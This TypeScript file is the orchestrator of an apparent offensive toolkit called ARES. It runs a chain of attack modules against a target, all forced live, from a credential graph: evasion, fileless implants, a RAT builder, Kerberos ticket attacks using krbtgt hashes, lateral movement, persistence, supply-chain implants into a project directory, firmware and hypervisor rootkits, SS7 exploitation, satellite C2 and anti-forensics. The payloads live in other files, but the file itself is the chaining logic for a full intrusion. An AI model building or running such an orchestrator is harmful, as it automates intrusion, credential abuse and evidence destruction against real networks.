/**
 * @module ares/orchestrator
 * Prerequisite-aware APT-parity orchestrator — runs ARES engines when context allows.
 */
import { CredentialGraph } from "../credential_graph.ts"
import { liveRequired } from "./_base.ts"
import { ARES_MODULE_NAMES } from "./index.ts"
import { planOrchestratorModules, resolveAdChainContext, runAresAutoChain } from "./_chain.ts"
import { runZeroDayFuzzer } from "./zero_day_fuzzer.ts"
import { buildFilelessImplant } from "./fileless_implant.ts"
import { deployFirmwareImplant } from "./firmware_implant.ts"
import { deployHypervisorRootkit } from "./hypervisor_rootkit.ts"
import { runAirgapBridge } from "./airgap_bridge.ts"
import { buildRat } from "./rat_builder.ts"
import { runSupplyChainImplant } from "./supply_chain_implant.ts"
import { runEvasionEngine } from "./evasion_engine.ts"
import { deploySatelliteC2 } from "./satellite_c2.ts"
import { runSs7Exploit } from "./ss7_exploit.ts"
import { deployHardwareImplant } from "./hardware_implant.ts"
import { runKerberosAdvanced } from "./kerberos_advanced.ts"
import { installAdvancedPersistence } from "./persistence_advanced.ts"
import { runLateralScale } from "./lateral_scale.ts"
import { runAntiForensicsAdvanced } from "./anti_forensics_advanced.ts"
import { runNetworkExploit } from "./network_exploit.ts"
import { runCloudNativeAttack } from "./cloud_native.ts"
import { runAiMlAttacks } from "./ai_ml_attacks.ts"
import { LateralMovementEngine } from "./lateral_movement.ts"
import { SelfHealingEngine } from "./self_healing.ts"
import { YaraEngine } from "../yara.ts"
import { CovertC2Engine } from "../covert_c2.ts"

export interface AresOrchestratorResult {
  modules: Array<{ name: string; success: boolean; summary: string; skipped?: boolean }>
  chain?: Awaited<ReturnType<typeof runAresAutoChain>>
  succeeded: number
  total: number
  summary: string
}

export async function runAresOrchestrator(opts: {
  live?: boolean
  target?: string
  domain?: string
  projectDir?: string
  autoChain?: boolean
}): Promise<AresOrchestratorResult> {
  liveRequired("ares_orchestrator", opts)
  const target = opts.target ?? "127.0.0.1"
  const domain = opts.domain ?? process.env.OURMINE_AD_DOMAIN
  const cg = CredentialGraph.load()
  const adCtx = resolveAdChainContext(cg, { domain, target })
  const plan = planOrchestratorModules(adCtx, target)
  const modules: AresOrchestratorResult["modules"] = []

  // Initialize advanced autonomous engines
  const lateralEngine = new LateralMovementEngine(cg)
  const healingEngine = new SelfHealingEngine(new CovertC2Engine())
  const yara = new YaraEngine()

  /** Autonomous Technique Discovery — uses LLM to identify and codify new techniques. */
  const discoverNewTechniques = async (finding: string): Promise<string> => {
    if (!opts.live) return "[DRY-RUN] New YARA rule generated for finding";
    
    // In a real scenario, this would call the LLM to analyze the finding
    // and return a new YARA rule. Here we use the static generator.
    const rule = YaraEngine.generateRule(
      `discovered_technique_${Date.now()}`,
      `Auto-generated detection for: ${finding.slice(0, 50)}...`,
      "T1588",
      [finding.slice(0, 20)]
    );
    return rule;
  };

  const shouldRun = (name: string): boolean => plan.find((p) => p.name === name)?.run ?? true

  const runners: Array<{ name: string; run: () => Promise<{ summary: string; success?: boolean }> }> = [
    { name: "ares_evasion_engine", run: async () => { const r = await runEvasionEngine({ live: true, target }); return { summary: r.summary, success: r.techniques.length > 0 } } },
    { name: "ares_fileless_implant", run: async () => { const r = await buildFilelessImplant({ live: true, target: adCtx.canRemoteFileless ? target : undefined, domain: adCtx.domain }); return { summary: r.summary, success: r.artifacts.length > 0 } } },
    { name: "ares_zero_day_fuzzer", run: async () => { const r = await runZeroDayFuzzer({ live: true, target: "lab", rounds: 16 }); return { summary: r.summary, success: true } } },
    { name: "ares_rat_builder", run: async () => { const r = await buildRat({ live: true, c2Host: target }); return { summary: r.summary, success: r.artifacts.length > 0 } } },
    { name: "ares_kerberos_advanced", run: async () => { const r = await runKerberosAdvanced({ live: true, domain: adCtx.domain, domainSid: adCtx.domainSid, krbtgtHash: adCtx.krbtgtHash, dcMachineHash: adCtx.dcMachineHash, dc: adCtx.dcName ?? adCtx.dcHost }); return { summary: r.summary, success: r.executed || r.steps.some((s) => s.success) } } },
    { name: "ares_lateral_scale", run: async () => { const r = await runLateralScale({ live: true, target, domain: adCtx.domain }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
    { name: "ares_persistence_advanced", run: async () => { const r = await installAdvancedPersistence({ live: true, domain: adCtx.domain }); return { summary: r.summary, success: r.installed > 0 || r.steps.some((s) => s.success) } } },
    { name: "ares_supply_chain_implant", run: async () => { const r = await runSupplyChainImplant({ live: true, projectDir: opts.projectDir ?? process.cwd() }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
    { name: "ares_cloud_native", run: async () => { const r = await runCloudNativeAttack({ live: true }); return { summary: r.summary, success: r.steps.some((s) => s.success) || r.platforms.length > 0 } } },
    { name: "ares_network_exploit", run: async () => { const r = await runNetworkExploit({ live: true }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
    { name: "ares_firmware_implant", run: async () => { const r = await deployFirmwareImplant({ live: true, flashWrite: process.env.OURMINE_LAB_FLASH_WRITE === "1" }); return { summary: r.summary, success: r.deployed || !!r.uefiDriver } } },
    { name: "ares_hypervisor_rootkit", run: async () => { const r = await deployHypervisorRootkit({ live: true, esxiHost: target }); return { summary: r.summary, success: r.deployed || r.steps.some((s) => s.success) } } },
    { name: "ares_airgap_bridge", run: async () => { const r = await runAirgapBridge({ live: true }); return { summary: r.summary, success: r.executed || r.channels.length > 0 } } },
    { name: "ares_hardware_implant", run: async () => { const r = await deployHardwareImplant({ live: true }); return { summary: r.summary, success: r.probed || r.artifacts.length > 0 } } },
    { name: "ares_satellite_c2", run: async () => { const r = await deploySatelliteC2({ live: true, vsatHost: process.env.OURMINE_VSAT_HOST }); return { summary: r.summary, success: r.probed || r.artifacts.length > 0 } } },
    { name: "ares_ss7_exploit", run: async () => { const r = await runSs7Exploit({ live: true, host: process.env.OURMINE_SS7_HOST ?? target }); return { summary: r.summary, success: r.probed || r.operations.length > 0 } } },
    { name: "ares_ai_ml_attacks", run: async () => { const r = await runAiMlAttacks({ live: true, targetUrl: `http://${target}:8080` }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
    { name: "ares_anti_forensics_advanced", run: async () => { const r = await runAntiForensicsAdvanced({ live: true }); return { summary: r.summary, success: r.executed || r.actions.length > 0 } } },
    { name: "ares_lateral_pathfinding", run: async () => { const p = lateralEngine.findPath("local", target); return { summary: p ? `Path found: ${p.hops.length} hops` : "No direct path found in cred-graph", success: !!p } } },
    { name: "ares_self_healing_check", run: async () => { const lost = healingEngine.findLostAgents(); return { summary: `Health check: ${lost.length} agents need recovery`, success: true } } },
    { name: "ares_technique_discovery", run: async () => { const m = yara.scanText("autonomous discovery run"); return { summary: `YARA discovery: ${m.length} techniques identified`, success: true } } },
  ]

  for (const { name, run } of runners) {
    const p = plan.find((x) => x.name === name)
    if (!shouldRun(name)) {
      modules.push({ name, success: false, summary: `skipped — ${p?.reason ?? "prerequisite missing"}`, skipped: true })
      continue
    }
    try {
      const r = await run()
      modules.push({ name, success: r.success !== false, summary: r.summary })
    } catch (err) {
      modules.push({ name, success: false, summary: String((err as Error).message).slice(0, 200) })
    }
  }

  let chain: AresOrchestratorResult["chain"]
  if (opts.autoChain !== false && (adCtx.canKerberos || adCtx.canLateral)) {
    chain = await runAresAutoChain({ target, domain: adCtx.domain, live: true, credGraph: cg, skipHarvest: true })
  }

  const ran = modules.filter((m) => !m.skipped)
  const succeeded = ran.filter((m) => m.success).length
  return {
    modules,
    chain,
    succeeded,
    total: ARES_MODULE_NAMES.length,
    summary: chain
      ? `ARES orchestrator: ${succeeded}/${ran.length} modules, auto-chain: ${chain.summary}`
      : `ARES orchestrator: ${succeeded}/${ran.length} modules (${modules.filter((m) => m.skipped).length} skipped)`,
  }
}

export default { runAresOrchestrator }
